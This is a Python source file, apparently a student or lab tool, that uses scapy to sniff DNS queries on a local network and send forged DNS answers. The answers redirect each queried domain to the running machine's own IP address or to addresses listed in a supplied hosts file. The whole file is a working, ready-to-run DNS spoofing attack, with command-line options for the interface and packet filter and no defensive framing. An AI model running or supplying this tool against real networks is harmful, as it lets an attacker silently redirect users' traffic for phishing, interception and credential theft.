import argparse
from scapy.all import *
hosts = {}


def myIp():
	soc = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	soc.connect(('8.8.8.8', 80))
	ip = soc.getsockname()[0]
	soc.close()
	return ip


def startSpoofing(packet):
	poisonAddr = myIp()
	if DNS in packet and packet[DNS].opcode == 0 and  packet[DNS].ancount == 0:
		domain = packet[DNS].qd.qname.decode('ASCII')
		domains = domain[:len(domain) - 1]
		domain = domain[:-1]
		if(hostFlag == True):
			if(hosts.get(domain) == None):
				print ("Domain Not Found")
				return
		if(hostFlag):
			poisonAddr = hosts[domain]
		
		spoof = IP(dst = packet[IP].src, src = packet[IP].dst) / \
		    UDP(dport = packet[UDP].sport, sport = packet[UDP].dport) / \
		    DNS(id = packet[DNS].id, qd = packet[DNS].qd, aa = 1, qr = 1, \
		    an = DNSRR(rrname = packet[DNS].qd.qname, ttl = 64, rdata = poisonAddr))
		send(spoof)
		print("Sent Spoofed Packet: ", spoof.summary())


def parseFile():
	global hosts
	fp = open(hostFile, "r")
	for line in fp:
		split = line.split()
		hosts[split[1]] = split[0]
	print (hosts)
	fp.close()


def getArgs():
	parser = argparse.ArgumentParser(description='Get Input Arguments', conflict_handler='resolve')
	parser.add_argument("-i")
	parser.add_argument("-h")
	parser.add_argument("exp", nargs='*', action="store")	
	args = parser.parse_args()
	return args

if __name__ == '__main__':
	global interfaceFlag, hostFlag, expFlag, hostFile, expression
	bpf = ""
	interfaceFlag = False
	hostFlag = False
	expFlag = False
	args = getArgs()
	interface = "eth0"
	if args.i:
		interfaceFlag = True
		interface = args.i
	if args.h:
		hostFlag = True
		hostFile = args.h
		parseFile()
	if args.exp:
		expFlag = True
		expression = args.exp
		bpf = bpf.join(expression).strip()
	if interfaceFlag:
		sniff(filter=bpf, iface=interface, store=0, prn=startSpoofing)
	else:
		sniff(filter=bpf, store=0, prn=startSpoofing)
